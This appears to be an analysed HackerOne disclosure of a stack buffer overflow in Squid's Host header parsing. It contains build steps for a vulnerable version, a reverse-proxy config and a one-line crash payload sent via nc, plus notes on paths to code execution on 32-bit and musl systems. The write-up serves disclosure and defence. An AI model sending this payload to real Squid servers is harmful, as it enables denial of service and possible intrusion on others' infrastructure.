# Squid Reverse Proxy Stack Buffer Overflow in Host Header Parsing

## Metadata
- **Source:** HackerOne
- **Report:** 778610 | https://hackerone.com/reports/778610
- **Submitted:** 2020-01-20
- **Reporter:** guido
- **Program:** Squid (HackerOne Internet Bug Bounty)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Stack Buffer Overflow, Information Disclosure, Denial of Service
- **CVEs:** None
- **Category:** memory-binary

## Summary
A stack buffer overflow vulnerability exists in Squid's Host header parsing when operating as a reverse proxy, allowing remote attackers to crash the service or potentially execute arbitrary code. The vulnerability results from improper bounds checking when processing oversized Host headers, affecting Squid versions prior to 4.10.

## Attack scenario
1. Attacker identifies target running vulnerable Squid version (4.8 or earlier) configured as reverse proxy
2. Attacker crafts HTTP request with excessively long Host header (256+ bytes) containing colon character
3. Malicious request is sent to Squid proxy port, bypassing Host header validation
4. Stack buffer overflow occurs during header parsing, corrupting adjacent stack memory
5. On systems without stack protector, attacker can overwrite return address or configuration variables for RCE
6. On protected systems, crash occurs via stack canary detection, achieving denial of service

## Root cause
Unsafe string handling in Host header parsing code fails to properly validate buffer bounds before copying user-supplied input. An overflowing subtraction during size calculation combined with null-terminated string operations enables writing past allocated buffer boundaries on the stack.

## Attacker mindset
Sophisticated threat actor targeting web infrastructure. Initial reconnaissance identifies Squid reverse proxies. Understanding of memory layout and stack exploitation techniques enables progression from DoS to potential RCE. Awareness of compiler protections and libc variations guides payload development across different target architectures.

## Defensive takeaways
- Implement strict input validation with explicit length limits on all HTTP headers before processing
- Use safe string functions with explicit bounds checking (e.g., strncat, strncpy with proper size arguments)
- Enable compiler-level protections by default: -fstack-protector-strong, ASLR, DEP/NX
- Conduct regular fuzzing of protocol parsing code with malformed/oversized inputs
- Monitor and promptly apply security updates from upstream projects
- Establish expedited security disclosure processes and response SLAs for critical issues
- Perform code review of all buffer operations, particularly in network-facing parsers

## Variant hunting
Search for similar header parsing vulnerabilities in other proxy/cache software (Varnish, nginx, Apache). Examine other HTTP header handlers in Squid codebase for identical patterns. Test other HTTP/1.1 headers with size constraints. Investigate CONNECT method handling and other protocol paths that process Host headers differently.

## MITRE ATT&CK
- T1190
- T1499
- T1557

## Notes
Critical issue was significantly delayed due to poor maintainer responsiveness and lack of coordination with Internet Bug Bounty program. Vulnerability is particularly dangerous on 32-bit systems and musl libc deployments (Alpine Linux, OpenWRT) where exploitation is more straightforward. Stack protector is not reliable defense. Data leak variant allows information disclosure without crashing service.

## Full report
<details><summary>Expand</summary>

## Summary:
This was a very difficult experience as Squid maintainers took a long time to answer. I tried getting help from HackerOne support, Dropbox support and the Internet Bug Bounty (never e-mailed me back) to no avail. What could have taken a few days took months.

The vulnerability concerns a stack buffer overflow (write) in parsing of the Host header if Squid acts as a reverse proxy.

The bug is fixed in Squid 4.10 released on 20 Jan 2020 which can be found here: http://www.squid-cache.org/Versions/v4/

## Steps To Reproduce:
```
mkdir squid-poc
cd squid-poc/
wget 'https://github.com/squid-cache/squid/archive/SQUID_4_8.tar.gz'
tar zxf SQUID_4_8.tar.gz
mkdir squid-install
cd squid-SQUID_4_8/
autoreconf -if
./configure --prefix=$(realpath ../squid-install)
make -j$(nproc)
make install
cd ../squid-install/sbin/
```

Create a file ```squid.conf``` with this contents. This is based on the instructions at https://wiki.squid-cache.org/ConfigExamples/Reverse/BasicAccelerator

```
http_port 9999 accel defaultsite=127.0.0.1 vhost vport=1
cache_peer 127.0.0.1 parent 80 0 no-query originserver name=myAccel
acl our_sites dstdomain your.main.website.name
http_access allow our_sites
cache_peer_access myAccel allow our_sites
cache_peer_access myAccel deny all
```

Run Squid:

The following is a oneliner to launch Squid and send the payload that crashes it:

```
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc localhost 9999
```

Output:

```
[1] 19871
*** buffer overflow detected ***: ./squid terminated
[1]+  Aborted                 (core dumped) ./squid -N -f squid.conf
```

## Supporting Material/References:

Exploitation with -fstack-protector enabled is impossible.
Some compilers don't enable -fstack-protector by default (like Clang without optimization flags).

Without stack protector, exploitation is relatively easy on 32 bit as valid addresses normally don't require a leading zero byte (which cannot be written by the payload, because the affected code treats it as a null-terminated string).
On 64 bit it is more difficult, but not necessarily impossible. Rather than overwriting the return address, changing the value of a (for instance boolean) configuration variable may be used.

Unlike glibc, musl libc is used does not write a NULL byte to the destination buffer if the size argument is very large, which happens here due to an overflowing subtraction. Hence, exploitation may be easier on systems that use musl libc, like OpenWRT and Alpine Linux.

There is also a small data leak for payloads of a particular length. This does not crash Squid, and makes it return uninitialized bytes located after the string buffer, usually just several (until a NULL byte is reached).

Fix: https://github.com/squid-cache/squid/pull/519

## Impact

Remote code execution (under certain circumstances), crashing a server (under most circumstances), leaking data from the server (under most circumstances).

</details>

---
*Analysed by Claude on 2026-05-12*
